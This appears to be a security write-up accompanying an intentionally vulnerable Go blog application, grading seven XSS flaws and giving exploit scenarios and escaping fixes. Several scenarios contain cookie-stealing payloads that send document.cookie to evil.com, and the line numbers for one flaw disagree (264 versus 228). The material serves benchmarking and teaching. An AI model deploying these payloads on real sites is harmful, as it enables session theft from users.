# Security Companion Document: main.go

## Language Exclusion Note: C and C++

C and C++ are excluded from the XSS vulnerability class because they are not typical web templating languages. While C and C++ can serve HTTP responses (e.g., via libmicrohttpd or cpp-httplib), they do not have standard HTML templating engines or web frameworks that produce dynamic HTML in the way that Python (Flask/Jinja2), Java (Spring Boot/Thymeleaf), Go (html/template), Rust (Actix-web), and JavaScript (Express.js) do. XSS vulnerabilities arise from the interaction between server-side code and HTML rendering in a browser, which is a pattern native to higher-level web frameworks rather than systems programming languages.

---

## Vulnerability: Reflected XSS via Tag Filter Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L98

### Description
The indexPage function embeds the `tag` query parameter directly into HTML using `fmt.Sprintf("<p>Filtering by tag: <strong>%s</strong></p>", tag)`. The tag value from `c.Query("tag")` is inserted without any HTML escaping.

### Exploitation Scenario
An attacker crafts a URL like `http://localhost:8085/?tag=<script>alert(document.cookie)</script>` and shares it with a victim. The script executes in the victim's browser when they visit the link.

### Remediation Guidance
Use Go's `html.EscapeString()` to escape the parameter:
```go
buf.WriteString(fmt.Sprintf("<p>Filtering by tag: <strong>%s</strong></p>", html.EscapeString(tag)))
```

### Complexity Rationale
This is rated Obvious because the query parameter flows directly from the request into HTML output via fmt.Sprintf with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the direct embedding of a query parameter into HTML via string formatting is a standard pattern that SAST tools reliably detect.

---

## Vulnerability: Stored XSS via Post Title and Content on View Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L148-L158

### Description
The viewPost function renders post title, author, tags, and content directly into HTML without escaping. The title is rendered via `fmt.Sprintf("<h1>%s</h1>", post.Title)`, and the content via `fmt.Sprintf("<div ...>%s</div>", post.Content)`. All fields are stored from user form input without sanitization.

### Exploitation Scenario
An attacker creates a post with content `<script>document.location='http://evil.com/?c='+document.cookie</script>`. When any user views the post, the script executes and exfiltrates their cookies.

### Remediation Guidance
Escape all user-supplied fields:
```go
buf.WriteString(fmt.Sprintf("<h1>%s</h1>", html.EscapeString(post.Title)))
buf.WriteString(fmt.Sprintf("<div>%s</div>", html.EscapeString(post.Content)))
```

### Complexity Rationale
This is rated Obvious because user-supplied data stored in the Post struct is directly formatted into HTML output with no escaping.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from stored data to HTML output via fmt.Sprintf is a straightforward pattern for SAST tools.

---

## Vulnerability: Stored XSS via Comment Author and Body

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L163-L165

### Description
The viewPost function renders comment author and body fields directly into HTML without escaping via `fmt.Sprintf("<strong>%s</strong>", cm.Author)` and `fmt.Sprintf("<p>%s</p>", cm.Body)`. The comment data is stored from form submission in the addComment function and later rendered in the viewPost function.

### Exploitation Scenario
An attacker submits a comment with body `<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">`. When any user views the post, the injected event handler fires.

### Remediation Guidance
Escape comment fields before rendering:
```go
buf.WriteString(fmt.Sprintf("<strong>%s</strong>", html.EscapeString(cm.Author)))
buf.WriteString(fmt.Sprintf("<p>%s</p>", html.EscapeString(cm.Body)))
```

### Complexity Rationale
This is rated Moderate because the data flows from the addComment POST handler through in-memory storage in the commentStore map before being rendered in the viewPost GET handler, requiring a reviewer to trace the data flow across two functions.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to track the taint from form parameters through the Comment struct storage and into the rendering loop in a separate function.

---

## Vulnerability: Reflected XSS via Search Query with Partial Escaping

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L244-L264

### Description
The searchPage function reflects the query parameter `q` in multiple locations with inconsistent escaping. The query is embedded unescaped in the search input value attribute (line 246), the results heading (line 251), and the search highlighting logic (line 258). However, the content preview on line 264 uses `html.EscapeString()`, creating a false sense of security while the query itself remains unescaped in other contexts.

### Exploitation Scenario
An attacker crafts `http://localhost:8085/search?q="><script>alert(1)</script>` which breaks out of the input value attribute. The query is also reflected unescaped in the results heading and the highlighting replacement.

### Remediation Guidance
Escape the query parameter consistently:
```go
safeQ := html.EscapeString(q)
buf.WriteString(fmt.Sprintf(`<input type="text" name="q" value="%s">`, safeQ))
buf.WriteString(fmt.Sprintf("<h2>Results for: %s</h2>", safeQ))
```

### Complexity Rationale
This is rated Nuanced because the content preview is properly escaped with `html.EscapeString()` on line 228, creating an inconsistent pattern. A reviewer seeing the escape call may assume all outputs are protected, missing the unescaped query in the input attribute and heading.

### Detection Difficulty Rationale
This is rated Likely_Missed because the presence of `html.EscapeString()` in the same function may cause SAST tools to reduce severity, and the multiple injection points across different HTML contexts require comprehensive taint analysis.

---

## Vulnerability: Stored XSS via Profile Fields with Attribute Injection

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L286-L288

### Description
The profilePage function renders user profile fields (DisplayName, Bio, Website) directly into HTML without escaping. The website field is injected into both an href attribute and link text via `fmt.Sprintf("<a href=\"%s\">%s</a>", profile.Website, profile.Website)`. The data flows from form submission through cookie-based user lookup before rendering.

### Exploitation Scenario
An attacker registers with website `javascript:alert(document.cookie)` to create a clickjacking link, or sets bio to `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`. When any user views the profile, the malicious content executes.

### Remediation Guidance
Escape all profile fields and validate URLs:
```go
buf.WriteString(fmt.Sprintf("<h1>%s</h1>", html.EscapeString(profile.DisplayName)))
buf.WriteString(fmt.Sprintf("<div><strong>Bio:</strong> %s</div>", html.EscapeString(profile.Bio)))
```

### Complexity Rationale
This is rated Moderate because the vulnerability spans multiple fields and output contexts (HTML body and href attribute), and the data flow involves cookie-based authentication to retrieve stored profile data.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace data from form submission through in-memory storage, cookie-based retrieval, and into multiple HTML output contexts.

---

## Vulnerability: Reflected XSS via Error Message Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L337

### Description
The errorPage function embeds the `msg` query parameter directly into HTML using `fmt.Sprintf("<h1>Error</h1><div style='color:red;'><p>%s</p></div>", msg)`. The message is taken from `c.Query("msg")` with no escaping.

### Exploitation Scenario
An attacker crafts `http://localhost:8085/error?msg=<script>alert('XSS')</script>` and shares the link. The script executes when the victim visits the URL.

### Remediation Guidance
Escape the error message:
```go
page := pageHeader + fmt.Sprintf("<h1>Error</h1><div style='color:red;'><p>%s</p></div>", html.EscapeString(msg)) + pageFooter
```

### Complexity Rationale
This is rated Obvious because the query parameter is directly formatted into HTML output with no processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because direct string formatting of a query parameter into HTML is a textbook reflected XSS pattern.

---

## Vulnerability: JSONP Callback Injection in API Endpoint

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L358

### Description
The apiPosts endpoint supports a `callback` query parameter for JSONP responses. The callback value is embedded directly into the response via `fmt.Sprintf("%s(%s)", callback, string(data))` and served with `Content-Type: application/javascript`. No validation is performed on the callback parameter.

### Exploitation Scenario
An attacker crafts `http://localhost:8085/api/posts?callback=alert(document.cookie)//` which produces `alert(document.cookie)//(...)`. When loaded via a `<script>` tag, this executes arbitrary JavaScript.

### Remediation Guidance
Validate the callback parameter:
```go
import "regexp"
validCallback := regexp.MustCompile(`^[a-zA-Z_$][a-zA-Z0-9_$]*$`)
if callback != "" && validCallback.MatchString(callback) {
```
Or remove JSONP support and use CORS headers instead.

### Complexity Rationale
This is rated Nuanced because JSONP callback injection is a less commonly recognized XSS vector that operates in a JavaScript execution context rather than an HTML context.

### Detection Difficulty Rationale
This is rated Likely_Missed because most SAST tools focus on HTML-context XSS and may not flag JSONP callback injection as a cross-site scripting vulnerability.
